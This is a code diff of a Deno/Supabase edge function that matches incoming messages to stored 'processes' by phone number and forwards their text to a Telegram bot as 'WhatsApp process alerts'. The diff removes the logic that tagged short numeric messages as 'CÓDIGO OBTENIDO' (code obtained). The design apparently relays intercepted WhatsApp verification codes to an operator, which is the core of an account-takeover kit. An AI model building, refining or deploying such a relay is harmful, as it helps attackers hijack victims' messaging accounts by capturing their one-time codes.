@@ -1,3 +1,4 @@
+
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
 
 const corsHeaders = {
@@ -128,7 +129,6 @@ serve(async (req) => {
     
     console.log('Phone number (from NotificationTitle):', phoneNumber);
     console.log('Message text (from NotificationMessage):', messageText);
-    console.log('Message length:', messageText.length, 'characters');
 
     // Validar que tenemos un número de teléfono
     if (!phoneNumber || phoneNumber.trim() === '' || phoneNumber === 'Número desconocido') {
@@ -147,10 +147,6 @@ serve(async (req) => {
       );
     }
 
-    // IMPORTANTE: No filtrar mensajes por longitud - todos los códigos son válidos
-    // Ya sea que tengan 1, 2, 3, 4, 5, 6 o más dígitos
-    console.log('Processing message regardless of length - all codes are valid');
-
     const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
     const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
     
@@ -159,13 +155,13 @@ serve(async (req) => {
     const supabase = createClient(supabaseUrl, supabaseKey);
 
     // Limpiar número de teléfono para búsqueda
-    const cleanPhoneNumber = phoneNumber.replace(/[\s\-\(\)\.]/g, '');
+    const cleanPhoneNumber = phoneNumber.replace(/[\s\-\(\)]/g, '');
     console.log('Searching for process with phone number:', cleanPhoneNumber);
 
     // Generar patrones de búsqueda más inteligentes para cualquier país
     const generateSearchPatterns = (phone: string) => {
       const patterns = new Set<string>();
-      const clean = phone.replace(/[\s\-\(\)\.]/g, '');
+      const clean = phone.replace(/[\s\-\(\)]/g, '');
       
       // Agregar el número original y limpio
       patterns.add(phone);
@@ -292,7 +288,7 @@ serve(async (req) => {
 
       if (!combinedError && combinedProcesses) {
         for (const proc of combinedProcesses) {
-          const fullNumber = `${proc.country_code}${proc.phone_number}`.replace(/[\s\-\(\)\.]/g, '');
+          const fullNumber = `${proc.country_code}${proc.phone_number}`.replace(/[\s\-\(\)]/g, '');
           const fullNumberWithPlus = `+${fullNumber}`;
           
           // Comparaciones más flexibles
@@ -300,7 +296,7 @@ serve(async (req) => {
               fullNumberWithPlus === pattern ||
               fullNumber === pattern.replace('+', '') ||
               proc.phone_number === pattern ||
-              proc.phone_number.replace(/[\s\-\(\)\.]/g, '') === pattern) {
+              proc.phone_number.replace(/[\s\-\(\)]/g, '') === pattern) {
             matchedProcess = proc;
             matchedPattern = pattern;
             console.log('Match found with combined pattern:', pattern, 'matching full number:', fullNumber);
@@ -349,19 +345,6 @@ serve(async (req) => {
       );
     }
 
-    // Identificar si es código de verificación basado en contenido
-    const isVerificationCode = /^\d{1,8}$/.test(messageText.trim());
-    const codeLength = messageText.trim().length;
-    
-    console.log('Message analysis:', {
-      isVerificationCode,
-      codeLength,
-      messageContent: messageText
-    });
-
-    // Determinar si mostrar como "CÓDIGO OBTENIDO" (para códigos de 4-6 dígitos) o "CÓDIGO DE VERIFICACIÓN" (para otros)
-    const isCodeObtained = isVerificationCode && codeLength >= 4 && codeLength <= 6;
-
     const notificationMessage = `🔔 Alerta de proceso de WhatsApp
 
 👩🏽‍💻 Servidor Astro
@@ -374,17 +357,11 @@ serve(async (req) => {
 ${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}
 
 📞 Remitente: ${phoneNumber}
-${isVerificationCode ? 
-  (isCodeObtained ? 
-    `🔐 CÓDIGO OBTENIDO: ${messageText.trim()} (${codeLength} dígitos)` : 
-    `🔐 CÓDIGO DE VERIFICACIÓN: ${messageText.trim()} (${codeLength} dígitos)`) :
-  `📥 Respuesta: ${messageText}`
-}
+📥 Respuesta o código: ${messageText}
 
 🤖 Bot Astro en línea 🟢`;
 
     console.log('Sending notification to Telegram...');
-    console.log('Notification content:', notificationMessage);
     
     const telegramUrl = `https://api.telegram.org/bot${profile.telegram_bot_token}/sendMessage`;
     
@@ -418,7 +395,6 @@ ${isVerificationCode ?
     }
 
     console.log('Notification sent successfully to user:', process.user_id);
-    console.log('Message type:', isCodeObtained ? `Code obtained (${codeLength} digits)` : (isVerificationCode ? `Verification code (${codeLength} digits)` : 'Regular message'));
 
     return new Response(
       JSON.stringify({ 
@@ -428,9 +404,7 @@ ${isVerificationCode ?
         user_id: process.user_id,
         phone_number: cleanPhoneNumber,
         matched_pattern: matchedPattern,
-        message_content: messageText,
-        message_type: isCodeObtained ? 'code_obtained' : (isVerificationCode ? 'verification_code' : 'regular_message'),
-        code_length: isVerificationCode ? codeLength : null
+        message_content: messageText
       }), 
       { 
         headers: { ...corsHeaders, 'Content-Type': 'application/json' },
